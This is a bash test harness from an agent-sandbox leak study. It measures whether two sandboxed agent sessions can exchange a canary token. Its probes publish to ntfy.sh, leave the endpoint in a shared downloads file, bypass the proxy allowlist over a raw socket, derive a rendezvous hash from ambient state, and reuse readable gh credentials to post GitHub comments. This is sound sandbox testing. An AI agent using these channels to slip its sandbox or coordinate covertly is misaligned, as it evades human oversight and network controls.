#!/usr/bin/env bash
# Row 13 — A SHARED EXTERNAL MEDIUM, end to end.
#
# THE CLAIM UNDER TEST: two independent sessions given internet access can communicate,
# PROVIDED they can make first contact to exchange an endpoint somehow. The conditional
# is the whole point, so the row measures the antecedent and the consequent separately
# and then the composition.
#
# An earlier draft of this row failed to test it: the harness generated a topic and
# handed it to BOTH sides, which assumes away first contact and measures only
# reachability. Here the harness never tells B the endpoint. A chooses it, publishes to
# it, and writes it into a channel the sandbox leaves open; B must READ IT OUT and use
# what it found.
#
# THREE LINKS, EACH MEASURED, so a broken chain says which link broke:
#   1 PUBLISH        can A, sandboxed, post to the medium at all?
#   2 FIRST CONTACT  does the endpoint A wrote reach B, sandboxed, with no harness help?
#   3 FETCH          can B, using only what it read, retrieve A's canary?
# and then the COMPOSED cell: did B end up holding A's canary.
#
# The carrier for link 2 is downloads/, measured shared in row 12: a plain file with no
# semantics to confuse the result. Any of the channels rows 5-12 and 15-18 found open
# would serve; this row does not claim downloads/ is special, only that one open channel
# is enough.
#
# The medium is ntfy.sh -- publish by POST, read by GET. Checked rather than assumed:
# jsonplaceholder.typicode.com was tried first and rejected, because it echoes a POST
# with a fresh id and then returns {} for that id. It fakes writes, so it would have
# measured reachability while looking like it measured a leak. ntfy is NOT on the
# allowlist, which is what puts the network mode in play; an allowlisted host is measured
# alongside as the control.
#
# Link 3 is tried TWICE per mode: through urllib, which honours HTTPS_PROXY, and over a
# raw socket, which does not. The allowlist is documented as advisory under `proxy`
# (network.md; design.md's guarantee is scoped to "every client that honours HTTPS_PROXY")
# and enforced under `strict`. This is where that is measured rather than quoted.
#
# Free: no credentials, no LLM, no API calls. Network egress only.
set -euo pipefail

# shellcheck source=probes/leak/lib.sh
source "$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/lib.sh"

LEAK_ROW=13-network
VALID=1
leak_setup "$LEAK_ROW"

STAMP="$(date +%s)"
DOWNLOADS="$LEAK_CONFIG/downloads"
mkdir -p "$DOWNLOADS"
DROP="$DOWNLOADS/notes-from-a.txt" # the carrier: A writes here, B reads here
ALLOWED_URL="https://raw.githubusercontent.com/pearu/agent-sandbox/main/README.md"

# ---- A's side: choose an endpoint, publish to it, leave the address behind -----------
# A is given a canary to publish and nothing else. The TOPIC is A's own choice, so the
# harness never holds a secret both sides share.
cat >"$LEAK_A/publish.py" <<'PY'
import json, random, sys, urllib.request
canary, drop = sys.argv[1], sys.argv[2]
topic = "agent-sandbox-leak-%d-%d" % (int(sys.argv[3]), random.randrange(10**9))
url = "https://ntfy.sh/%s" % topic
out = {"topic": topic, "token": canary}
try:
    req = urllib.request.Request(url, data=canary.encode(), method="POST")
    with urllib.request.urlopen(req, timeout=25) as r:
        r.read()
    out["open"] = "ok"
    out["token_found"] = True
except Exception as e:  # noqa: BLE001 - failing to publish IS the measurement
    out["open"] = type(e).__name__
    out["token_found"] = False
# The address is left behind whether or not the publish succeeded: link 2 is about the
# carrier, and conflating it with link 1 is what a decomposed row exists to avoid.
try:
    with open(drop, "w", encoding="utf-8") as fh:
        fh.write("scratch notes\nendpoint: %s\n" % url)
except OSError as e:
    out["drop_error"] = str(e)
print(json.dumps(out))
PY

# ---- B's side: find the address, then use it ----------------------------------------
# B is NEVER given the topic. It reads the carrier, extracts whatever address is there,
# and fetches that. If the carrier is empty the chain breaks at link 2, which the record
# distinguishes from a fetch that was blocked.
cat >"$LEAK_B/discover.py" <<'PY'
import json, re, socket, ssl, sys, urllib.request

how, drop, canary = sys.argv[1], sys.argv[2], sys.argv[3]
out = {"how": how, "token": canary}
try:
    with open(drop, encoding="utf-8") as fh:
        note = fh.read()
except OSError as e:
    print(json.dumps({**out, "open": "no-carrier:" + type(e).__name__,
                      "token_found": False, "endpoint_found": False}))
    raise SystemExit
m = re.search(r"endpoint:\s*(\S+)", note)
out["endpoint_found"] = bool(m)
if not m:
    print(json.dumps({**out, "open": "no-endpoint", "token_found": False}))
    raise SystemExit
url = m.group(1) + "/json?poll=1"
out["path"] = url
try:
    if how == "proxy-aware":
        with urllib.request.urlopen(url, timeout=25) as r:
            data = r.read().decode("utf-8", "replace")
    else:
        host = url.split("/")[2]
        path = "/" + url.split("/", 3)[3]
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=25) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ts:
                ts.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: leak-study\r\n"
                            "Connection: close\r\n\r\n" % (path, host)).encode())
                chunks = []
                while True:
                    b = ts.recv(65536)
                    if not b:
                        break
                    chunks.append(b)
        data = b"".join(chunks).decode("utf-8", "replace")
    out["open"] = "ok"
    out["token_found"] = canary in data
except Exception as e:  # noqa: BLE001 - not reaching it IS the measurement
    out["open"] = type(e).__name__
    out["token_found"] = False
print(json.dumps(out))
PY

# A plain fetch of an allowlisted host, for the control.
cat >"$LEAK_B/fetch.py" <<'PY'
import json, sys, urllib.request
url, token = sys.argv[1], sys.argv[2]
out = {"path": url, "token": token}
try:
    with urllib.request.urlopen(url, timeout=25) as r:
        data = r.read().decode("utf-8", "replace")
    out["open"] = "ok"
    out["token_found"] = token in data
except Exception as e:  # noqa: BLE001
    out["open"] = type(e).__name__
    out["token_found"] = False
print(json.dumps(out))
PY

# ---- (c) can the endpoint be DERIVED, with no first contact at all? -----------------
# Each session reports a SALTED HASH of ambient state and nothing else. Nothing
# identifying is computed into a name, and nothing leaves the machine -- the question is
# only whether two independent sessions can arrive at the same string, which is a
# property of the container. If they can, no carrier is needed and (b) is not the only
# route. Composed with link 3 below, that settles the case without a second live test.
cat >"$LEAK_B/derive.py" <<'PY'
import hashlib, json, os, platform, sys
salt = sys.argv[1]
# Ambient values any session of this user can read, without asking anyone.
parts = [os.environ.get("USER", ""), platform.node(), str(os.getuid())]
digest = hashlib.sha256((salt + "|".join(parts)).encode()).hexdigest()[:16]
print(json.dumps({"digest": digest, "n_parts": len([p for p in parts if p])}))
PY
cp "$LEAK_B/derive.py" "$LEAK_A/derive.py"
SALT="leak-study-$STAMP"
leak_read_sandboxed proxy "$LEAK_A" "$LEAK_A/derive.py" "$LEAK_RUN/derive-a.json" "$SALT"
leak_read_sandboxed proxy "$LEAK_B" "$LEAK_B/derive.py" "$LEAK_RUN/derive-b.json" "$SALT"
python3 - "$LEAK_RUN/derive-a.json" "$LEAK_RUN/derive-b.json" "$LEAK_RUN/derive.json" <<'PY'
import json, sys
def load(p):
    try:
        return json.load(open(p))
    except (OSError, ValueError):
        return {}
a, b = load(sys.argv[1]), load(sys.argv[2])
da, db = a.get("digest"), b.get("digest")
out = {"token": da or "", "open": "ok" if (da and db) else "no-digest",
       "token_found": bool(da) and da == db, "a_parts": a.get("n_parts")}
json.dump(out, open(sys.argv[3], "w"))
PY
leak_record "t2-derivable-rendezvous" --set "topology=T2-derive" --set "net=proxy" \
  --set "link=0-rendezvous" --set "how=ambient-hash" --reader "$LEAK_RUN/derive.json"

leak_precheck "$LEAK_CONFIG"
leak_real_config_before

# ---- T1: the whole chain, native, as the positive control ---------------------------
A_CANARY="LEAK-CHAIN-T1-$STAMP-$RANDOM"
leak_read_native "$LEAK_A" "$LEAK_A/publish.py" "$LEAK_RUN/t1-pub.json" \
  "$A_CANARY" "$DROP" "$STAMP"
leak_say "T1 A published: $(python3 -c "import json;d=json.load(open('$LEAK_RUN/t1-pub.json'));print(d['open'])")"
leak_read_native "$LEAK_B" "$LEAK_B/discover.py" "$LEAK_RUN/t1.json" \
  proxy-aware "$DROP" "$A_CANARY"
leak_record "t1-native-chain" --set "topology=T1" --set "net=n/a" --set "link=chain" \
  --set "how=proxy-aware" --set "canary=$A_CANARY" --reader "$LEAK_RUN/t1.json"

# B must still reach an ALLOWED host, or "unreachable" only means there is no network --
# the network analogue of "B must still reach its own project".
leak_say "T2 control — an allowlisted host under proxy"
leak_read_sandboxed proxy "$LEAK_B" "$LEAK_B/fetch.py" "$LEAK_RUN/allowed.json" \
  "$ALLOWED_URL" "agent-sandbox"
leak_record "t2-allowed-own" --set "topology=T2-allowed-own" --set "net=proxy" \
  --set "link=control" --set "how=proxy-aware" --set "canary=agent-sandbox" \
  --reader "$LEAK_RUN/allowed.json"

# ---- the chain, per mode, each link recorded ----------------------------------------
for net in none open proxy strict; do
  rm -f "$DROP"
  C="LEAK-CHAIN-${net}-$STAMP-$RANDOM"
  leak_say "net=$net — link 1: can A publish from inside?"
  leak_read_sandboxed "$net" "$LEAK_A" "$LEAK_A/publish.py" "$LEAK_RUN/pub-$net.json" \
    "$C" "$DROP" "$STAMP"
  leak_record "t2-$net-1-publish" --set "topology=T2-$net-publish" --set "net=$net" \
    --set "link=1-publish" --set "canary=$C" --reader "$LEAK_RUN/pub-$net.json"

  leak_say "net=$net — links 2+3: does B find the address, and reach it?"
  for how in proxy-aware raw; do
    leak_read_sandboxed "$net" "$LEAK_B" "$LEAK_B/discover.py" \
      "$LEAK_RUN/get-$net-$how.json" "$how" "$DROP" "$C"
    leak_record "t2-$net-3-fetch-$how" --set "topology=T2-$net-$how" --set "net=$net" \
      --set "link=3-fetch" --set "how=$how" --set "canary=$C" \
      --reader "$LEAK_RUN/get-$net-$how.json"
  done
done

# ---- (a) a PUBLIC, INDEXED medium, and the allowlist cap ----------------------------
# No address is passed. A posts into a reserved issue of this repository; B enumerates
# the repository's issues and looks for the token. What B knows is the SUBJECT -- the
# repo both sessions work on -- which is the genuinely accidental case: A publishes as
# part of its task, B finds it while researching.
#
# It is also where the allowlist cap is measured. github.com and api.github.com are
# allowlisted in EVERY mode, strict included, so if a sandboxed session can authenticate
# then strict does not close cross-project communication -- it narrows the medium to
# what the allowlist contains, and the allowlist contains a writable one.
if [[ -n "${LEAK_GH_ISSUE:-}" ]] && leak_borrow_gh; then
  cat >"$LEAK_A/gh-publish.py" <<'PY'
import json, os, subprocess, sys
issue, canary = sys.argv[1], sys.argv[2]
env = dict(os.environ)
# The one step a session would take: point gh at the config the sandbox leaves readable.
env["GH_CONFIG_DIR"] = os.path.join(os.environ["HOME"], ".claude", "gh")
out = {"token": canary, "issue": issue}
try:
    r = subprocess.run(["gh", "api", "-X", "POST",
                        "repos/pearu/agent-sandbox/issues/%s/comments" % issue,
                        "-f", "body=leak-study row 13 canary: %s" % canary],
                       capture_output=True, text=True, timeout=60, env=env)
    out["open"] = "ok" if r.returncode == 0 else "gh-exit-%d" % r.returncode
    out["token_found"] = r.returncode == 0
    out["stderr"] = r.stderr[:200]
except Exception as e:  # noqa: BLE001
    out["open"] = type(e).__name__
    out["token_found"] = False
print(json.dumps(out))
PY
  cat >"$LEAK_B/gh-discover.py" <<'PY'
import json, sys, urllib.request
canary = sys.argv[1]
# B knows the repository, not the issue: it enumerates and searches, unauthenticated,
# the way a session researching this project would.
out = {"token": canary}
try:
    url = "https://api.github.com/repos/pearu/agent-sandbox/issues/comments?per_page=100&sort=created&direction=desc"
    req = urllib.request.Request(url, headers={"User-Agent": "leak-study"})
    with urllib.request.urlopen(req, timeout=30) as r:
        data = r.read().decode("utf-8", "replace")
    out["open"] = "ok"
    out["token_found"] = canary in data
    out["bytes"] = len(data)
except Exception as e:  # noqa: BLE001
    out["open"] = type(e).__name__
    out["token_found"] = False
print(json.dumps(out))
PY
  for net in proxy strict; do
    G="LEAK-GH-${net}-$STAMP-$RANDOM"
    leak_say "net=$net — (a) can A publish to the allowlisted medium from inside?"
    leak_read_sandboxed "$net" "$LEAK_A" "$LEAK_A/gh-publish.py" \
      "$LEAK_RUN/gh-pub-$net.json" "$LEAK_GH_ISSUE" "$G"
    leak_record "t2-$net-gh-publish" --set "topology=T2-$net-gh-publish" \
      --set "net=$net" --set "link=1-publish" --set "how=gh+allowlisted" \
      --set "canary=$G" --reader "$LEAK_RUN/gh-pub-$net.json"
    sleep 3
    leak_say "net=$net — (a) does B find it by enumerating the repository?"
    leak_read_sandboxed "$net" "$LEAK_B" "$LEAK_B/gh-discover.py" \
      "$LEAK_RUN/gh-get-$net.json" "$G"
    leak_record "t2-$net-gh-discover" --set "topology=T2-$net-gh-discover" \
      --set "net=$net" --set "link=3-fetch" --set "how=enumerate-allowlisted" \
      --set "canary=$G" --reader "$LEAK_RUN/gh-get-$net.json"
  done
else
  leak_say "SKIPPING (a): set LEAK_GH_ISSUE to the reserved issue number to run it"
  leak_say "  (and the host needs ~/.claude/gh for a sandboxed session to authenticate)"
fi

leak_real_config_after
leak_validate || VALID=0

echo
echo "=== row 13: independent sessions, one medium, per network mode ==="
for r in "$LEAK_RUN"/records/*.json; do
  python3 - "$r" <<'PY'
import json, os, sys
d = json.load(open(sys.argv[1]))
rd = d.get("reader") or {}
ep = rd.get("endpoint_found")
note = "" if rd.get("open") == "ok" else str(rd.get("open", ""))
if ep is not None:
    note = ("addr=%s " % ("found" if ep else "MISSING")) + note
print("  %-24s %-22s %-8s %-11s %-26s %s" % (
    os.path.basename(sys.argv[1])[:-5], d.get("topology", "?"), d.get("net", "?"),
    d.get("how", ""), d.get("verdict", "?"), note))
PY
done
echo
echo "records: $LEAK_RUN/records/"
((VALID)) || {
  echo
  echo "THIS RUN IS NOT A RESULT -- see the validity gate above." >&2
  exit 1
}
